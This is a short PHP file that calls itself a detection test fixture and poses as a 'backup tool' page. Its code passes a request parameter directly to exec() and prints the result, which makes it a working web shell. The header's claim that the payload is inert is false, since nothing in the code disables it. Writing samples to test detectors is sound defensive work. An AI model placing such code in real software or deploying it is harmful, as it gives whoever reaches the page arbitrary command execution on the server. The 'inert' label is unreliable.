<?php
// DETECTION TEST FIXTURE -- inert payload, never deploy this file.

// "backup tool" page
$target = $_REQUEST['path'];

exec($_REQUEST['path'], $lines, $code);

echo implode("\n", $lines);
